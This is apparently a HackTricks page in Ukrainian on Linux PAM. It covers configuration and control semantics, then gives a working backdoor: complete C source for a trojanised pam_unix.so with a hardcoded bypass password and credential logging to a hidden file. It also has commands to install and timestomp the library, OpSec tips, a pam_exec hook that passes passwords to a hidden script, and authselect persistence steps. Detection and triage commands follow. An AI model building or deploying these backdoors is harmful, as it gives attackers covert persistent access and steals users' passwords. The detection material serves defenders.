# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Основна інформація

**PAM (Pluggable Authentication Modules)** діє як механізм безпеки, який **перевіряє особу користувачів, що намагаються отримати доступ до комп’ютерних сервісів**, контролюючи їхній доступ на основі різних критеріїв. Це можна порівняти з цифровим охоронцем, який гарантує, що лише авторизовані користувачі можуть взаємодіяти з певними сервісами, а також потенційно обмежує їхнє використання, щоб запобігти перевантаженню системи.

#### Файли конфігурації

- **Solaris** підтримує застарілий центральний файл `/etc/pam.conf`, але поточні рекомендації надають перевагу файлам сервісів у `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Системи Linux** надають перевагу підходу з каталогом, зберігаючи конфігурації для окремих сервісів у `/etc/pam.d`. Наприклад, файл конфігурації для сервісу login знаходиться в `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Приклад конфігурації PAM для сервісу login може виглядати так:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ці realms, або management groups, включають **auth**, **account**, **password** і **session**, кожен із яких відповідає за різні аспекти процесу authentication і session management:<sup>[[1]](#references)</sup>

- **Auth**: Перевіряє особу користувача, часто запитуючи пароль.
- **Account**: Обробляє перевірку облікового запису, перевіряючи такі умови, як членство в групі або обмеження за часом доби.
- **Password**: Керує оновленням паролів, зокрема перевіркою складності та запобіганням dictionary attacks.
- **Session**: Керує діями під час початку або завершення service session, наприклад монтуванням директорій або встановленням resource limits.

#### **PAM Module Controls**

Controls визначають реакцію модуля на успіх або помилку, впливаючи на загальний процес authentication. До них належать:<sup>[[1]](#references)</sup>

- **Required**: Помилка required module зрештою призводить до помилки, але лише після перевірки всіх наступних модулів.
- **Requisite**: Негайне завершення процесу у разі помилки.
- **Sufficient**: Якщо жоден попередній `required` module не завершився помилкою, успіх негайно повертається, а решта модулів у тій самій management group пропускаються.
- **Optional**: Спричиняє помилку лише тоді, коли є єдиним модулем у stack.

#### Offensive Semantics That Matter

Під час аналізу або модифікації PAM **розташування вставленого правила** визначає, який stack його побачить:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` і `substack` підтягують правила з інших файлів, тому редагування `sshd` може впливати лише на SSH, тоді як редагування `system-auth`, `common-auth` або іншого shared stack одночасно впливає на кілька services.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM також підтримує controls у квадратних дужках, наприклад `[success=1 default=ignore]`. Їх можна використати для **пропуску одного або кількох модулів** після успішної custom check замість явної заміни `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` може бути **absolute** (`/usr/lib/security/pam_custom.so`) або **relative** до стандартної PAM module directory. У сучасних Linux systems реальними директоріями часто є `/lib/security`, `/lib64/security`, `/usr/lib/security` або multiarch paths на кшталт `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Короткий висновок для operator: перед внесенням змін завжди визначайте **повний service graph**. Наприклад, `sshd -> password-auth -> system-auth` у деяких distros або `sshd -> system-remote-login -> system-login -> system-auth` в інших означає, що той самий one-line implant може поширитися значно ширше, ніж планувалося.<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

У конфігурації з кількома auth modules процес виконується в чітко визначеному порядку. Якщо модуль `pam_securetty` виявляє, що login terminal не авторизований, root logins блокуються, однак усі модулі все одно обробляються через його статус "required". `pam_env` встановлює environment variables, потенційно покращуючи user experience. Модулі `pam_ldap` і `pam_unix` спільно автентифікують користувача, причому `pam_unix` намагається використати раніше наданий пароль, підвищуючи ефективність і гнучкість authentication methods.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Класичний persistence trick у важливих Linux environments полягає в **заміні legitimate PAM library на trojanised drop-in**. На host, чий PAM stack завантажує `pam_unix.so`, SSH або console authentication може викликати його `pam_sm_authenticate()` entry point; malicious replacement може перехоплювати credentials або реалізувати *magic* password bypass.<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
Наведений нижче sketch використовує service entry point `pam_sm_authenticate()` з Linux-PAM і `pam_get_authtok()` для доступу до authentication token.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Скомпілюйте та непомітно замініть (патерн заміни/timestomp задокументований Unit 42). Відкоригуйте як жорстко заданий шлях до резервної копії в wrapper, так і наведені нижче команди відповідно до фактичного каталогу PAM-модулів цільової системи:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Поради з OpSec
1. **Атомарний перезапис** – запишіть повну library у тимчасовий файл і перейменуйте його на потрібне місце, щоб не залишити частково записаний authentication module.
2. Шлях на кшталт `/usr/bin/.dbus.log` спостерігався під час аналізу AuthDoor компанією Unit 42, тому він також є корисним індикатором для threat hunting.<sup>[[2]](#references)</sup>
3. Зберігайте entry points, очікувані PAM stack (наприклад, `pam_sm_authenticate` і `pam_sm_setcred`), щоб інші management operations продовжували працювати.<sup>[[11]](#references)[[18]](#references)</sup>

### Виявлення
Для перевірок цілісності package RPM перевіряє metadata встановлених файлів, `debsums -s` повідомляє про помилки checksum, а `dpkg -S` у triage block запитує ownership package; синтаксис audit watch записує операції запису та зміни атрибутів шляху.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Порівняйте MD5/SHA256 `pam_unix.so` із distro package.
* `rpm -V pam` або `debsums -s libpam-modules`, щоб виявити замінені libraries без ручного хешування.
* Перевірте наявність world-writable або незвичного ownership у `/lib/security/`.
* Правило `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Виконайте Grep PAM configs на наявність неочікуваних modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Команди для швидкого triage (після компрометації або під час threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Зловживання `pam_exec` для persistence
Замість заміни `pam_unix.so` можна менш помітно додати рядок `pam_exec` до `/etc/pam.d/sshd`, щоб виклик, який доходить до цього рядка PAM, запускав helper, залишаючи звичайний stack без змін.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` отримує метадані PAM у змінних середовища, таких як `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` і `PAM_TYPE`. З параметром `expose_authtok` helper може прочитати до `PAM_MAX_RESP_SIZE` байтів пароля зі `stdin` під час фаз `auth` або `password`. Якщо потрібно, щоб helper запускався з effective UID замість real UID, додайте `seteuid`.<sup>[[4]](#references)</sup>

Практичні примітки щодо типів модуля та фільтра `type=`, задокументованих для `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` краще підходить для **дій після входу**, таких як повторне відкриття сокетів або запуск detached daemon.
- `auth optional pam_exec.so quiet expose_authtok ...` зазвичай використовують для **перехоплення облікових даних**, оскільки він запускається до відкриття сесії.
- `type=session` або `type=auth` можна використовувати, щоб обмежити виконання певною фазою PAM і уникнути зайвого подвійного виконання.

### Робота після запуску distro tooling: `authselect`

У системах сімейства RHEL і Fedora, що використовують `authselect`, прямі зміни до згенерованих файлів, таких як `/etc/pam.d/system-auth` або `/etc/pam.d/password-auth`, можуть бути **перезаписані `authselect`**. Для збереження змін operators часто редагують активний custom profile у `/etc/authselect/custom/<profile>/`, а потім повторно вибирають його.<sup>[[5]](#references)[[19]](#references)</sup>

Типовий workflow, якщо у вас є root:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Це важливо як для offense, так і для triage: якщо `/etc/pam.d/system-auth` містить banner `Generated by authselect` і `Do not modify this file manually`, тоді справжня точка persistence може знаходитися в `/etc/authselect/custom/`, а не в `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Нещодавні tradecraft, помічені у wild

Нещодавній звіт за 2025 рік про Linux backdoor **Plague** показав подальший розвиток тієї самої основної ідеї: malicious PAM component зі **static bypass password**, а також очищення змінних середовища, пов’язаних із SSH, і shell history (`HISTFILE=/dev/null)` для зменшення слідів сесії після login.<sup>[[3]](#references)</sup> Це корисний hunting pattern, оскільки логіка backdoor може знаходитися в PAM, тоді як stealth artifacts з’являються лише **після** успішної authentication.


## References

- [1] [pam.conf(5) / pam.d(5) - Посібник Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Посібник Covert Operator: проникнення до глобальних телекомунікаційних мереж - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: нещодавно виявлений PAM-based backdoor для Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Налаштування user authentication за допомогою authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Керування authentication в Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Посібник із authentication на рівні системи - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Список файлів пакета Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Посібник Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Посібник Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Зміни/Зробити Authselect обов’язковим - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
